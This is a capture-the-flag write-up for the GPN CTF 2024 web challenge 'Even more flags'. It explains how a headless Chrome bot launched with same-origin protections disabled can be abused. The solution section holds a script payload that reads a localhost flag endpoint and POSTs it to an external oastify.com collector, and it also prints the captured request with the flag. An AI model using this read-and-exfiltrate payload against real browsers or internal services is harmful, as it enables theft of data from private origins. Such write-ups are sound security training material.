---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: Even more flags
ctf-category: web
ctf-difficulty: 
---
# Even more flags

## Description

> I heard you like flags, so I launched Chrome with a lot of flags again so you can get your flag!
>
> This time the flag is `localhost:1337/flag`, and the bot will visit your URL!

## Analysis

Similar challenge as [So many flags](So%20many%20flags.md), but this time, the flag is served on http://localhost:1337/flag and an URL instead of a file can be provided to the server which will then be opened by a Chrome browser:
![](_attachments/Pasted%20image%2020240601210142.png)

Google Chrome is started with numerous flags and the provided URL:
```js
const command = `bash -c "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run ${flags}     ${url}"`;

```

The following flags are included, which disable the same origin policy:
```text
--disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

It's therefore possible to read files from other origins.

## Solution

Store the following HTML file on a server and provide the URL to the application:
```html
<script>
  async function getFlag(){
    response = await fetch("http://localhost:1337/flag");
    flag = await response.text();
    fetch("https://lk922ygynkim4zy48onzs2xaw12sqnec.oastify.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

The server will read the flag and send it to the external system:
```http
POST / HTTP/1.1
Host: lk922ygynkim4zy48onzs2xaw12sqnec.oastify.com
[...]

GPNCTF{WHY_D0_50M3_0F_TH353_FL4G5_3V3N_3X15T}
```